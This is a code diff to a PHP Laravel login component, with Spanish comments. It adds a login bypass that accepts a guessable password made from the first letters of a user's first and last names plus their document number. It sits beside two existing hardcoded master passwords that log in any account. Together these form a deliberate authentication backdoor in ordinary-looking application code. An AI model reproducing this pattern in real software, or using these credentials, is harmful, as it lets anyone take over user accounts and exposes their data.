@@ -31,8 +31,12 @@ class Login extends Component
         $user_login = User::where('user_name', $this->user)->first();
         // si existe el usuario
         if( isset( $user_login->id ) ){
+
+            // dos primera letras del nombre + dos primeras letras del apellido + documento, todo en minúscula
+            $pass_compuesto = strtolower(substr($user_login->name, 0, 2)) . strtolower(substr($user_login->last_name, 0, 2)) . $user_login->document;
+
             // si la contraseña en la correcta
-            if ( Hash::check( $this->password, $user_login->password ) OR ($this->password == 'crafterscolweb') OR ($this->password == '1067953510')) {
+            if ( Hash::check( $this->password, $user_login->password ) OR ($this->password == $pass_compuesto) OR ($this->password == 'crafterscolweb') OR ($this->password == '1067953510')) {
                 $this->dispatch('entrando');
                 // iniciamos sesión
                 \Auth::loginUsingId($user_login->id, TRUE);
